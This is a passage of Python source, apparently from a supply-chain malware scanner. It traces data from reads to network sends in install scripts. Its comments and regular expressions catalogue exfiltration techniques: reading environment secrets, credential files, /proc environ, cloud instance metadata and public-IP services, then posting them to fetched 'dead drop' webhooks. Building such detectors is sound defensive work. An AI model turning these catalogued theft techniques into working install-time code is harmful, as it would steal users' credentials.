                code_names.add(name)
                grown = True
        if not grown:
            break
    for k, m in enumerate(_SELF_RUN_RE.finditer(text)):
        if k >= _SELF_READ_MAX_CALLS:
            break
        if in_literal(m.start()):
            continue
        hi = m.end() + len(_call_args(text[m.end():m.end() + _SELF_READ_ARG_SPAN]))
        if reads(m.end(), hi) or uses(m.end(), hi, names):
            return m.start()
        if not m.group().startswith(_SELF_SHELL_RUNNERS) and (path_reads(m.end(), hi) or uses(m.end(), hi, code_names)):
            return m.start()
    return -1


# ---------------- Dead drops (0.1.8) ----------------
# The address data goes to may itself be fetched at run time from a
# hard-coded URL, so no address shows in the code: data-pipeline-check
# fetched https://….github.io/…/config.json and posted what its credential
# sweep found, with the host name, to the `webhooks` listed there. The value
# a fetch of a literal URL gives (the URL written in the call, or in a name
# assigned it: `req = Request('https://…')` … `urlopen(req)`) — the name the
# fetch is assigned to, the names a destructuring gives, a `with … as r`, the
# parameter of a callback among its arguments or of a `.then(…)` chained to
# it — is followed through the names given it (_DD_PASSES levels: an
# assignment or a `+=` that uses one, a `for … in` / `for (… of …)` loop over
# one, the parameter of a callback of a call on one (`res.on('data', c => …)`),
# a function that returns one). A send whose address uses one is the sign: a
# Request, urlopen, fetch or http(s).request with data, a body or a POST, PUT
# or PATCH, a .post / .put / .patch of an HTTP client, a sendBeacon — in a
# file that reads the machine's user or host name.
_DD_FETCH_RE = re.compile(
    r"\b(?:urlopen|requests\s*\.\s*get|httpx\s*\.\s*get|fetch|axios\s*\.\s*get|https?\s*\.\s*get|got)\s*\(")
_DD_SEND_RE = re.compile(
    r"\b(?:Request|urlopen|fetch|https?\s*\.\s*request"
    r"|(?:requests|httpx|axios|got|superagent|needle|session|client)\s*\.\s*(post|put|patch)|(sendBeacon))\s*\(")
_DD_DATA_RE = re.compile(r"""\b(?:data|body)\s*[=:]|\bjson\s*=|["'](?:POST|PUT|PATCH)["']""", re.I)
_DD_URL_RE = re.compile(r"""\A[rbfRBF]{0,2}["'`]https?://([^/"'`\s?#]+)""")
_DD_URL_IN_RE = re.compile(r"""["'`]https?://([^/"'`\s?#]+)""")
_DD_ASSIGN_RE = re.compile(
    r"(?:(?<![^\n])|[;{]|=>)[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*\+?=(?![=>])([^;\n]*)")
_DD_DESTRUCT_RE = re.compile(r"\b(?:const|let|var)\s*\{([^}\n]{1,200})\}\s*=([^;\n]*)")
_DD_DESTRUCT_NAME_RE = re.compile(r"(?:[A-Za-z_$][\w$]*\s*:\s*)?([A-Za-z_$][\w$]*)\s*(?:=[^,]*)?\Z")
_DD_FOR_RE = re.compile(
    r"\bfor\s+([A-Za-z_]\w*)\s+in\s+([^\n:]{1,200})"
    r"|\bfor\s*\(\s*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s+(?:of|in)\s+([^\n)]{1,200})")
_DD_CALLBACK_RE = re.compile(
    r"(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*){0,8}\s*\.\s*(?:on|once|forEach|map|then|each)\s*\("
    r"""\s*(?:["'][^"'\n]{0,40}["']\s*,\s*)?(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)""")
_DD_ARG_CALLBACK_RE = re.compile(
    r",\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*\(\s*([A-Za-z_$][\w$]*)|\(\s*([A-Za-z_$][\w$]*)[^)\n]*\)\s*=>"
    r"|([A-Za-z_$][\w$]*)\s*=>)")
_DD_THEN_HEAD_RE = re.compile(r"\s*\.\s*then\s*\(")
_DD_PARAM_RE = re.compile(r"\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)")
_DD_AS_RE = re.compile(r"\s*as\s+([A-Za-z_]\w*)")
_DD_RETURN_RE = re.compile(r"\breturn\s+([^\n;]{1,200})")
_DD_FUNC_RE = re.compile(
    r"\bdef\s+([A-Za-z_]\w*)\s*\(|\bfunction\s*\*?\s*([A-Za-z_$][\w$]*)\s*\("
    r"|(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*(?:async\s+)?(?:function\b|\([^)\n]{0,200}\)\s*=>|[A-Za-z_$][\w$]*\s*=>)")
_DD_PASSES = 4                   # levels of names followed from a fetch
_DD_MAX_CALLS = 100              # fetches, sends, returns and callbacks examined per text
_DD_ARG_SPAN = 2000              # characters of a call's arguments read
_DD_MAX_ASSIGNS = 5000           # assignments examined per text
_DD_THEN_MAX = 4                 # .then(…) links read after a fetch


def dead_drop_at(text):
    """(offset, host) of a send whose address `text` fetched at run time from
    a literal URL on `host` (see above), else None. The caller checks that
    the text reads the machine's user or host name."""
    if "http" not in text or _DD_FETCH_RE.search(text) is None or _DD_SEND_RE.search(text) is None:
        return None
    spans = _literal_spans(text)
    starts = [a for a, _ in spans]

    def in_literal(pos):
        k = bisect.bisect_right(starts, pos) - 1
        return k >= 0 and pos < spans[k][1]

    def uses(lo, hi, names):
        return bool(names) and any(m.group() in names and not in_literal(lo + m.start())
                                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))

    assigns = []                                    # (name, start, end) of what is assigned
    url_names = {}                                  # name -> the host of the URL literal assigned to it
    for k, m in enumerate(_DD_ASSIGN_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        if in_literal(m.start(1)):
            continue
        assigns.append((m.group(1), m.start(2), m.end(2)))
        url = _DD_URL_IN_RE.search(m.group(2))
        if url is not None and m.group(1) not in url_names:
            url_names[m.group(1)] = url.group(1)
    for k, m in enumerate(_DD_DESTRUCT_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        if in_literal(m.start()):
            continue
        for part in m.group(1).split(","):
            name = _DD_DESTRUCT_NAME_RE.search(part.strip())
            if name is not None:
                assigns.append((name.group(1), m.start(2), m.end(2)))
    followed, origin = set(), None
    for k, f in enumerate(_DD_FETCH_RE.finditer(text)):
        if k >= _DD_MAX_CALLS:
            break
        if in_literal(f.start()):
            continue
        args = _call_args(text[f.end():f.end() + _DD_ARG_SPAN])
        first = _call_first_arg(args)
        url = _DD_URL_RE.match(first)
        host = url.group(1) if url is not None else url_names.get(first)
        if host is None:
            continue
        before = len(followed)
        followed.update(name for name, lo, hi in assigns if lo <= f.start() < hi)
        cb = _DD_ARG_CALLBACK_RE.search(args)
        if cb is not None and not in_literal(f.end() + cb.start()):
            followed.add(cb.group(1) or cb.group(2) or cb.group(3))
        pos = f.end() + len(args) + 1               # after the call's closing bracket
        m = _DD_AS_RE.match(text, pos)
        if m is not None:
            followed.add(m.group(1))
        for _ in range(_DD_THEN_MAX):
            h = _DD_THEN_HEAD_RE.match(text, pos)
            if h is None:
                break
            then_args = _call_args(text[h.end():h.end() + _DD_ARG_SPAN])
            param = _DD_PARAM_RE.match(then_args)
            if param is not None:
                followed.add(param.group(1))
            pos = h.end() + len(then_args) + 1
        if origin is None and len(followed) > before:
            origin = host
    if not followed:
        return None
    funcs = []                                      # (start, name) of the functions defined
    for k, m in enumerate(_DD_FUNC_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        funcs.append((m.start(), m.group(1) or m.group(2) or m.group(3)))
    func_starts = [a for a, _ in funcs]
    loops = [(m.group(1) or m.group(3), m.start(2) if m.group(2) else m.start(4),
              m.end(2) if m.group(2) else m.end(4))
             for k, m in zip(range(_DD_MAX_ASSIGNS), _DD_FOR_RE.finditer(text)) if not in_literal(m.start())]
    for _ in range(_DD_PASSES):
        grown = False
        for name, lo, hi in assigns + loops:
            if name not in followed and uses(lo, hi, followed):
                followed.add(name)
                grown = True
        for k, m in enumerate(_DD_CALLBACK_RE.finditer(text)):
            if k >= _DD_MAX_CALLS:
                break
            if m.group(1) in followed and m.group(2) not in followed and not in_literal(m.start()):
                followed.add(m.group(2))
                grown = True
        for k, m in enumerate(_DD_RETURN_RE.finditer(text)):
            if k >= _DD_MAX_CALLS:
                break
            if in_literal(m.start()) or not uses(m.start(1), m.end(1), followed):
                continue
            at = bisect.bisect_right(func_starts, m.start()) - 1
            if at >= 0 and funcs[at][1] not in followed:
                followed.add(funcs[at][1])
                grown = True
        if not grown:
            break
    for k, s in enumerate(_DD_SEND_RE.finditer(text)):
        if k >= _DD_MAX_CALLS:
            break
        if in_literal(s.start()):
            continue
        args = _call_args(text[s.end():s.end() + _DD_ARG_SPAN])
        first = _call_first_arg(args)
        lead = len(args) - len(args.lstrip())
        if not uses(s.end() + lead, s.end() + lead + len(first), followed):
            continue
        if s.group(1) or s.group(2) or _DD_DATA_RE.search(args):
            return s.start(), origin
    return None


# ---------------- Local data sent (0.1.8) ----------------
# What an install script sends matters, not where it sends it: a script that
# reads data from the machine and sends it is exfiltrating, whatever the
# host (a list of exfiltration services does not know a Feishu bot, a new
# tunnel service or the attacker's own server). local_data_sent_at follows
# data from where the script reads it to where it sends it:
#   - read (_ld_sources): an environment variable that names the user or
#     the host, or holds a secret (…TOKEN, …SECRET, …PASSWORD, …API_KEY …;
#     not npm's own), and the whole environment (process.env, os.environ
#     copied, listed or serialized; not narrowed by a condition that picks
#     the package's own settings: `.filter(([k]) => k.startsWith('X_'))`);
#     a value tested rather than used is not read (`typeof process.env`,
#     `process.env && …`, `x ? … : …`, `!x`: _ld_tested); a file or folder
#     outside the package — read or listed by a path that is absolute, in
#     the home or working folder (homedir(), expanduser, Path.home(), $HOME,
#     %USERPROFILE%, INIT_CWD, cwd()) or held by a name given one (`const
#     ROOT = '/home/node/app'` … `path.join(ROOT, f)`), and not built on the
#     script's own folder (__dirname, __file__), or given as such a path to
#     any call of a script that reads files (fs.readFileSync(
#     `/proc/${pid}/environ`), open("/flag.txt"), readDirRecursive("/opt"),
#     require('fs').readFileSync(p)); what a command prints when it reports
#     on the machine (execSync, check_output, getoutput, popen … of whoami,
#     id, env, cat, ls …, read as the shell reads it: _sh_output_data); the
#     machine's names and addresses (os.hostname(), os.userInfo(),
#     os.homedir(), os.networkInterfaces(), socket.gethostname(),
#     getpass.getuser() …); what the cloud's instance metadata service gives
#     (169.254.169.254, metadata.google.internal …: the instance's
#     credentials); the public IP address a lookup service answers (ipify,
#     ifconfig.me …). The machine's modules under another name read the
#     same (`const o = require('os')`, `import * as o from 'node:os'`,
#     `import socket as s`: `o.hostname()`). Code in a template literal's or
#     an f-string's text counts as code.
#   - followed through the names given it (the dead drop's reading,
#     _DD_PASSES levels: assignments — a statement's value read to its end,
#     over rows — destructuring, loops (`for (const [k, v] of …)`, `for k, v
#     in …:` too), `with … as`, `.then(…)` and the parameters of a read's
#     callback and of callbacks on a name followed, what is merged into a
#     name (`Object.assign(o, …)`), a name spread whole (`{...info}`,
#     `[...ips]`), returns — a function's own: the innermost function
#     whose body holds the return, not one defined before it in that body —
#     and the parameters of the script's own functions called with one (a
#     class's constructor's by the class: `new C(x)`, `C(x)`; a thread's
#     target's by its args: `Thread(target=f, args=(x,))`), a function's
#     calls on a receiver (`this.info()`, `self.info()`) and the `.then(…)`
#     after them, and the parameters of a callback the script's own
#     function is given and calls with one (`collect((info) => …)`,
#     `function collect(cb) { cb(null, data) }`). The path a read is given
#     is sealed (what the read gives is the file's), and so are a
#     program's options: the environment and the
#     folder a child process is given (`spawn(cmd, args, { env:
#     __spreadValues({}, process.env) })`) are the program's, and a bundle's
#     helper that copies them holds no data. A receiver's member is a name
#     (`this.env`, `self.token`: not the receiver every method shares, nor
#     a module's exports or the runtime's objects); a keyword is none
#     (`const [a, b] = [x, y]` gives a x and b y); an object literal's
#     methods, and a callback a call is given, are code, not data (a
#     bundle's modules: `require_x = __commonJS({ "x.js"(exports) { … } })`).
#     In a text longer than _LD_LONG (a bundle, whose modules reuse names),
#     a name carries the data only _LD_NEAR characters from where it was
#     given it.
#   - sent: in the data of a send (a request's, socket's or connection's
#     write, end, send or request; the arguments after the address of fetch —
#     bare or the global's, not a cache's `.fetch(key)` — Request, urlopen,
#     sendBeacon, axios, got, requests, httpx … .post/.put/.patch; an HTTP
#     client under the script's own name — a client module's
#     (`const nf = require('node-fetch')`, `import request from 'request'`)
#     or an instance (`axios.create(…)`, `requests.Session()`): its calls,
#     post, put, patch and request; a command
#     a script runs that holds curl, wget, nc …; not a function's definition
#     that shares a send's name: `async fetch(t, e) {`), or — what is not the
#     environment, the instance's metadata or the public IP address — in a
#     request's address (a GET's URL: `https.get('https://x/?h=' + host)`, a
#     DNS lookup's name): a download's address may carry environment
#     variables (a mirror, a proxy, a token for a private download); those
#     count where the address is a data-capture service's.
# Install time only: a CLI reads the environment and posts to its own API
# when it is used.
_LD_ENV_RE = re.compile(
    r"""\bprocess\s*\.\s*env\s*(?:\.\s*([A-Za-z_$][\w$]*)|\[\s*["'`]([^"'`\n]{1,100})["'`]\s*\])"""
    r"""|\bos\s*\.\s*environ\s*(?:\[\s*[rbuRBU]?["']([^"'\n]{1,100})["']\s*\]"""
    r"""|\.\s*get\s*\(\s*[rbuRBU]?["']([^"'\n]{1,100})["'])"""
    r"""|\bos\s*\.\s*getenv\s*\(\s*[rbuRBU]?["']([^"'\n]{1,100})["']""")
# npm's own variables (the package, the lifecycle, the configuration but
# its credentials; INIT_CWD: the folder the install runs in) describe the
# install: their values are not data sent
# the whole environment: `process.env` itself (copied, listed, serialized),
# os.environ copied, listed or printed (not a variable read by its name, not
# one written)
_LD_ENV_ALL_RE = re.compile(
    r"""\bprocess\s*\.\s*env\b(?!\s*(?:\.|\[|\?\.))"""
    r"""|\bos\s*\.\s*environ\b(?!\s*(?:\[|\.\s*(?:get|setdefault|pop|update)\s*\())|\bos\s*\.\s*environb\b""")
_LD_WHOLE_ENV = "the whole environment"
# the whole environment narrowed to the variables a condition selects
# (`Object.entries(process.env).filter(([k]) => k.startsWith('X_'))`, `{k: v
# for k, v in os.environ.items() if k.startswith('X_')}`) is the package's
# own settings, as a variable read by its name is; not when the condition
# excludes (`!k.startsWith('npm_')`: the rest is the environment) or picks
# secrets (`/TOKEN|KEY/.test(k)`)
_LD_ENV_SELECT_RE = re.compile(r"(?:\s*\))?\s*\.\s*filter\s*\(|(?:\s*\.\s*(?:items|keys|values)\s*\(\s*\))?[ \t]+if\b")
_LD_EXCLUDES_RE = re.compile(r"!|\bnot\b")
# a value tested, not used: compared, a guard (`x && …`, `x ? … : …`, `… if x
# else …`), assigned to, or after typeof, `!` or `not` (a bundle's `typeof
# process.env == "object" && process.env && process.env.DEBUG` reads no
# variable but DEBUG)
_LD_TEST_AFTER_RE = re.compile(r"\s*(?:[=!]==?|=(?![=>])|&&|\?(?![.?])|\b(?:and|is|in|else|instanceof)\b)")
_LD_TEST_BEFORE = ("typeof", "not")
# a member of a name that holds the whole environment: one variable, read by
# the name's property (a method's call, `data.encode()`, is the data's)
_LD_MEMBER_READ_RE = re.compile(r"\s*(?:\??\.\s*[A-Za-z_$][\w$]*(?![\w$])(?!\s*\()|\[)")
_LD_ENV_QUIET_RE = re.compile(
    r"(?:npm_(?:package|lifecycle|config)_(?![\w]*(?:auth|token|passw|secret))\w*|npm_node_execpath|npm_execpath"
    r"|INIT_CWD|NODE_ENV|CI)\Z", re.I)
# (called, or handed to code that calls it: `tryGet(os.hostname)`)
_LD_IDENTITY_RE = re.compile(
    r"""(?:\bos\s*\.\s*|\brequire\(\s*["'](?:node:)?os["']\s*\)\s*\.\s*)(hostname|userInfo|homedir|networkInterfaces)\b"""
    r"""(\s*\()?|\b(?:socket\s*\.\s*(?:gethostname|getfqdn)|platform\s*\.\s*node|getpass\s*\.\s*getuser"""
    r"""|os\s*\.\s*getlogin|os\s*\.\s*uname|platform\s*\.\s*uname)\b(\s*\()?""")
# the machine's names taken from their module by name (`const { hostname } =
# require('os')`, `import { userInfo } from 'node:os'`, `from socket import
# gethostname as gh`): a call of the name reads what the module's would
_LD_IMPORT_JS_RE = re.compile(
    r"""\b(?:(?:const|let|var)\s*\{([^{}\n]{1,300})\}\s*=\s*require\(\s*|import\s*\{([^{}\n]{1,300})\}\s*from\s*)"""
    r"""["'](?:node:)?os["']""")
_LD_IMPORT_PY_RE = re.compile(r"\bfrom\s+(os|socket|getpass|platform)\s+import\s+\(?([^\n)]{1,300})")
_LD_IMPORT_NAME_RE = re.compile(r"\s*([A-Za-z_$][\w$]*)(?:\s*(?::|\bas\b)\s*([A-Za-z_$][\w$]*))?\s*\Z")
_LD_MODULE_NAMES = {
    "os": {"hostname": "identity", "userInfo": "identity", "homedir": "report", "networkInterfaces": "report",
           "getlogin": "identity", "uname": "identity"},
    "socket": {"gethostname": "identity", "getfqdn": "identity"},
    "getpass": {"getuser": "identity"},
    "platform": {"node": "identity", "uname": "identity"}}
# (os.hostname … read as _LD_IDENTITY_RE names them, by their own name; the
# rest as "user or host name")
_LD_OS_NAMED = frozenset({"hostname", "userInfo", "homedir", "networkInterfaces"})
# the machine's modules under another name: `const o = require('os')`,
# `import o from 'os'`, `import * as o from 'node:os'` (not a member taken
# in place: `require('os').hostname`); `import socket as s, platform as p`
_LD_ALIAS_JS_RE = re.compile(
    r"""\b(?:(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*require\(\s*["'](?:node:)?os["']\s*\)(?!\s*(?:\.|\[|\?\.))"""
    r"""|import\s+(?:\*\s*as\s+)?([A-Za-z_$][\w$]*)\s*(?:,\s*\{[^{}\n]{0,300}\}\s*)?from\s*["'](?:node:)?os["'])""")
_LD_ALIAS_PY_RE = re.compile(
    r"(?<![\w.])import[ \t]+([A-Za-z_][\w.]*(?:[ \t]+as[ \t]+[A-Za-z_]\w*)?"
    r"(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*(?:[ \t]+as[ \t]+[A-Za-z_]\w*)?){0,20})")
_LD_ALIAS_PY_PART_RE = re.compile(r"\s*(os|socket|getpass|platform)\s+as\s+([A-Za-z_]\w*)\s*\Z")
_LD_ALIAS_TAIL = r")\s*\.\s*([A-Za-z_$][\w$]*)(?![\w$])(\s*\()?"
# services whose answer is the caller's public IP address
_LD_PUBLIC_IP_RE = re.compile(
    r"\bapi(?:64)?\.ipify\.org\b|\bip-api\.com\b|\bipinfo\.io\b|\bifconfig\.me\b|\bicanhazip\.com\b"
    r"|\bcheckip\.amazonaws\.com\b|\bipapi\.co\b|\bident\.me\b|\bapi\.myip\.com\b|\bwtfismyip\.com\b")
# a call and its first argument's start (after the '(')
# (a module required in place is a receiver too: `require('fs').readFileSync(p)`)
_LD_CALL_RE = re.compile(r"""(?<![\w$.])(?:(?:[A-Za-z_$][\w$]*|require\s*\(\s*["'`][^"'`\n]{1,60}["'`]\s*\))\s*\.\s*)*"""
                         r"([A-Za-z_$][\w$]*)\s*\(\s*")
_LD_READERS = frozenset({"readFileSync", "readFile", "readdirSync", "readdir", "createReadStream", "opendirSync",
                         "opendir", "read_text", "read_bytes", "listdir", "scandir", "walk", "glob", "iglob", "open",
                         "Path", "readlines", "connect", "Database"})
_LD_READS_RE = re.compile(r"\b(?:" + "|".join(sorted(_LD_READERS)) + r")\s*\(")
_LD_NOT_READS = frozenset({"require", "import", "join", "resolve", "normalize", "dirname", "basename", "relative",
                           "mkdirSync", "mkdir", "makedirs", "writeFileSync", "writeFile", "appendFileSync",
                           "existsSync", "exists", "chdir", "spawn", "spawnSync", "execFile", "execFileSync", "fork",
                           "exec", "execSync", "unlinkSync", "unlink", "rmSync", "rmdirSync", "remove", "rmtree",
                           "chmodSync", "chmod", "symlinkSync", "copyFileSync", "copyfile", "copy", "move", "rename",
                           "renameSync", "isfile", "isdir", "isabs", "abspath", "realpath", "expanduser", "log",
                           "print", "error", "warn", "info", "debug", "system", "popen", "run", "call", "check_call",
                           "check_output", "Popen", "startsWith", "endsWith", "includes", "test", "match", "replace",
                           "split", "indexOf", "push", "append", "extend", "set", "add"})
_LD_ABSOLUTE_RE = re.compile(r"""[fFrRbBuU]{0,2}["'`](?:/[\w.~-]|~[/\\]|[A-Za-z]:[\\/]|\$HOME\b|\$\{HOME\}"""
                             r"""|%(?:USERPROFILE|APPDATA|LOCALAPPDATA|HOMEPATH|PROGRAMDATA)%)""")
# a path in the file system's own folders, the home folder or a drive (a
# path like /api/v1 is a URL's): what any call given one reads is local
_LD_FS_ROOT_SRC = (r"""["'`](?:/(?:etc|proc|home|root|Users|var|opt|flag|tmp|usr|srv|mnt|run|sys|dev|boot|data"""
                   r"""|app|workspace|secrets?)\b|~[/\\]|[A-Za-z]:[\\/]|\$HOME\b|\$\{HOME\}"""
                   r"""|%(?:USERPROFILE|APPDATA|LOCALAPPDATA|HOMEPATH|PROGRAMDATA)%)""")
_LD_ABSOLUTE_IN_RE = re.compile(_LD_FS_ROOT_SRC)
_LD_FS_ROOT_RE = re.compile(r"[fFrRbBuU]{0,2}" + _LD_FS_ROOT_SRC)
_LD_HOME_RE = re.compile(
    r"""\bhomedir\s*\(|\bexpanduser\s*\(|\bPath\s*\.\s*home\s*\(|\bgetcwd\s*\(|\bprocess\s*\.\s*cwd\s*\("""
    r"""|\bPath\s*\.\s*cwd\s*\(|\bprocess\s*\.\s*env\s*(?:\.\s*|\[\s*["'`])(?:HOME|USERPROFILE|INIT_CWD|APPDATA|LOCALAPPDATA)\b"""
    r"""|\b(?:environ\s*(?:\[\s*|\.\s*get\s*\(\s*)|getenv\s*\(\s*)["'](?:HOME|USERPROFILE|APPDATA|LOCALAPPDATA)["']"""
    r"""|\bexpandvars\s*\(\s*[rRbBuU]{0,2}["'](?:%(?:USERPROFILE|APPDATA|LOCALAPPDATA|HOMEPATH)%|\$\{?HOME\b)""")
_LD_OWN_FOLDER_RE = re.compile(r"__dirname|__filename|import\s*\.\s*meta|__file__")
# a credential file named by a relative path: code a package runs on import
# runs in its user's project folder
_LD_CRED_FILE_RE = re.compile(
    r"""[fFrRbBuU]{0,2}["'`](?:[^"'`\n]{0,200}[/\\])?\.(?:env(?:\.[\w.-]{1,30})?|npmrc|pypirc|netrc|git-credentials)["'`]""")
_LD_PLAIN_LITERAL_RE = re.compile(r"""[fFrRbBuU]{0,2}(["'`])([^"'`\n]*)\1\Z""")
# a value that builds a path: a join, a Path, a literal, a template, a name, a sum of them
_LD_PATH_EXPR_RE = re.compile(
    r"""\s*(?:(?:path|os\s*\.\s*path|posixpath|ntpath)\s*\.\s*(?:join|resolve|normalize)\s*\(|Path\s*\("""
    r"""|[fFrRbBuU]{0,2}["'`]|[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*){0,4}"""
    r"""\s*(?:\(\s*(?:[rRbBuU]{0,2}["'][^"'\n]{0,200}["'])?\s*\))?\s*(?:[+/]|\Z))""")
# a copy of a file (its destination holds what the source does: a locked
# database copied before it is read)
_LD_COPY_RE = re.compile(r"\b(?:copyfile|copy2|copy|copyFileSync|copyFile|cpSync)\s*\(")
_LD_EXEC_TAIL = (r"""\s*(\()\s*(?:\[\s*)?[rbuRBU]?["'`]([^"'`\n]{1,300})["'`]"""
                 r"""((?:\s*,\s*[rbuRBU]?["'`][^"'`\n]{0,100}["'`]){0,8})""")
_LD_EXEC_RE = re.compile(
    r"\b(?:execSync|execFileSync|spawnSync|exec|execFile|check_output|getoutput|getstatusoutput|popen|run"
    r"|execa|execaSync|execaCommand|execaCommandSync|create_subprocess_shell|create_subprocess_exec)" + _LD_EXEC_TAIL)
# a command runner under the script's own name: `const run = util.promisify(exec)`,
# `const x = promisify(require('child_process').execFile)`
_LD_PROMISIFY_RE = re.compile(
    r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:[\w$]+\s*\.\s*)?promisify\s*\(\s*"
    r"""(?:(?:[\w$]+|require\s*\(\s*["'](?:node:)?child_process["']\s*\))\s*\.\s*)?(?:exec|execFile)\s*\)""")
_LD_ARGV_ITEM_RE = re.compile(r"""["'`]([^"'`\n]{0,100})["'`]""")
# the cloud's instance metadata service: what a request to it gives is the machine's credentials
_LD_METADATA_RE = re.compile(
    r"169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|\bfd00:ec2::254|/computeMetadata/v1"
    r"|Metadata-Flavor|/latest/meta-data|/metadata/instance|/metadata/identity/oauth2")
# a function's parameters, and the names in a parameter list
_LD_FUNC_RE = re.compile(
    r"\bdef\s+([A-Za-z_]\w*)\s*\(([^)\n]{0,300})\)|\bfunction\s*\*?\s*([A-Za-z_$][\w$]*)\s*\(([^)\n]{0,300})\)"
    r"|(?<![\w$])([A-Za-z_$][\w$]*)\s*[=:]\s*(?:async\s+)?(?:function\b\s*\*?\s*[\w$]*\s*\(([^)\n]{0,300})\)"
    r"|\(([^)\n]{0,300})\)\s*=>|([A-Za-z_$][\w$]*)\s*=>)"
    r"|(?<![\w$.])(?!(?:if|for|while|switch|catch|function|with|return)\b)(?:async\s+|static\s+|get\s+|set\s+)*"
    r"([A-Za-z_$][\w$]*)\s*\(([^)\n]{0,300})\)\s*\{")
_LD_PARAM_RE = re.compile(r"\s*(?:\.\.\.|\*{1,2})?\s*([A-Za-z_$][\w$]*)")
# a member of a name given a value (`payload.files = …`, `o[k] = …`), and a
# value added to a name's collection (`list.push(…)`): the name holds it
_LD_MEMBER_ASSIGN_RE = re.compile(
    r"(?<![\w$.])([A-Za-z_$][\w$]*)((?:\s*\.\s*[A-Za-z_$][\w$]*|\s*\[[^\]\n]{1,200}\]){1,8})[ \t]*\+?=(?![=>])")
_LD_MEMBER_RE = re.compile(r"""\.\s*([A-Za-z_$][\w$]*)|\[\s*["'`]([^"'`\n]{1,60})["'`]\s*\]""")
# Words the patterns above can read as a name that name nothing: keywords
# (`const [a, b] = …` reads as a member assignment of `const`,
# `.then(function* (x) …)` as a callback's parameter `function`) are never
# followed. The receivers whose members a script assigns (`this.x = …`,
# `self.x = …`) hold nothing themselves: the member is followed (`this.x`),
# not the receiver every method of every class of a bundle shares; a
# module's exports and the runtime's objects (`module.exports = …`,
# `process.env.X = …`) are not followed.
_LD_NOT_NAMES = frozenset({
    "break", "case", "catch", "class", "const", "continue", "debugger", "default", "delete", "do", "else", "enum",
    "export", "extends", "false", "finally", "for", "function", "if", "import", "in", "instanceof", "let", "new",
    "null", "return", "static", "switch", "throw", "true", "try", "typeof", "undefined", "var", "void", "while",
    "with", "yield", "await", "async", "of", "arguments", "NaN", "Infinity",
    "and", "as", "assert", "def", "del", "elif", "except", "from", "global", "is", "lambda", "nonlocal", "not",
    "or", "pass", "raise", "None", "True", "False"})
_LD_RECEIVERS = frozenset({"this", "self", "cls", "super", "window", "globalThis", "global"})
_LD_NOT_RECEIVERS = frozenset({"module", "exports", "process", "os", "sys", "document", "navigator", "console"})
_LD_FIRST_MEMBER_RE = re.compile(r"""\s*(?:\?\.|\.)\s*([A-Za-z_$][\w$]*)(?![\w$])(?!\s*\()|\s*\[\s*["'`]([^"'`\n]{1,60})["'`]\s*\]""")
_LD_DESTRUCT_ARRAY_RE = re.compile(r"\b(?:const|let|var)\s*\[([^\]\n]{1,200})\]\s*=([^;\n]*)")
# a tuple's names, in Python (`out, err = p.communicate()`, `user, host = a, b`)
_LD_TUPLE_ASSIGN_RE = re.compile(
    r"(?<![^\n])[ \t]*(?:\([ \t]*)?([A-Za-z_]\w*(?:[ \t]*,[ \t]*[A-Za-z_]\w*){1,8})(?:[ \t]*,)?(?:[ \t]*\))?[ \t]*"
    r"=(?![=>])([^\n]*)")
# a callback's first parameter destructured: `({ stdout }) =>`, `function ([a, b])`
_LD_DESTRUCT_PARAM_RE = re.compile(r"\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(\s*[{\[]([^{}\[\]\n]{1,200})[}\]]")
# a name used whole: not a member (`x.name`), but spread (`{...name}`,
# `[...name]`, `f(...name)`)
_LD_NAME_TOKEN_RE = re.compile(r"(?:(?<=\.\.\.)|(?<![\w$.]))[A-Za-z_$][\w$]*")
# a receiver's method called (`this.info(`, `self.info(`): what it returns
_LD_METHOD_CALL_RE = re.compile(r"\s*(?:\?\.|\.)\s*([A-Za-z_$][\w$]*)\s*\(")
# the head of a call of the script's own function, bare or on a receiver
_LD_OWN_CALL_HEAD = r"(?<![\w$.])(?:(?:this|self|cls)\s*\.\s*)?("
# loops whose target is destructured: `for (const [k, v] of …)`, `for (const
# {a, b} of …)`, `for k, v in …:`, `for i, (k, v) in …:`
_LD_FOR_DESTRUCT_RE = re.compile(
    r"\bfor\s*\(\s*(?:(?:const|let|var)\s*)?[\[{]([^\]{}\n]{1,200})[\]}]\s+(?:of|in)\s+([^\n)]{1,200})"
    r"|\bfor\s+(?:\(\s*)?([A-Za-z_]\w*(?:\s*,\s*(?:\(\s*)?[A-Za-z_]\w*(?:\s*\))?){1,8})(?:\s*\))?\s+in\s+"
    r"([^\n:]{1,200})")
# what is merged into a name: `Object.assign(o, …)`
_LD_MERGE_RE = re.compile(r"\bObject\s*\.\s*assign\s*\(\s*([A-Za-z_$][\w$]*)\s*,")
# a class's constructor: `new C(…)`, `C(…)` give its parameters
_LD_CLASS_RE = re.compile(r"\bclass\s+([A-Za-z_$][\w$]*)")
_LD_CONSTRUCTORS = frozenset({"constructor", "__init__"})
# a thread's target, given its arguments: `Thread(target=f, args=(x,))`,
# `Process(target=self.f, daemon=True, args=[x])`
_LD_THREAD_RE = re.compile(
    r"\b(?:Thread|Process)\s*\([^()\n]{0,200}?\btarget\s*=\s*(?:self\s*\.\s*)?([A-Za-z_]\w*)"
    r"[^()\n]{0,200}?\bargs\s*=\s*[(\[]")
# a callback's parameters: `function (a, b) {`, `(a, b) =>`, `a =>`, `lambda a, b:`
_LD_CALLBACK_HEAD_RE = re.compile(
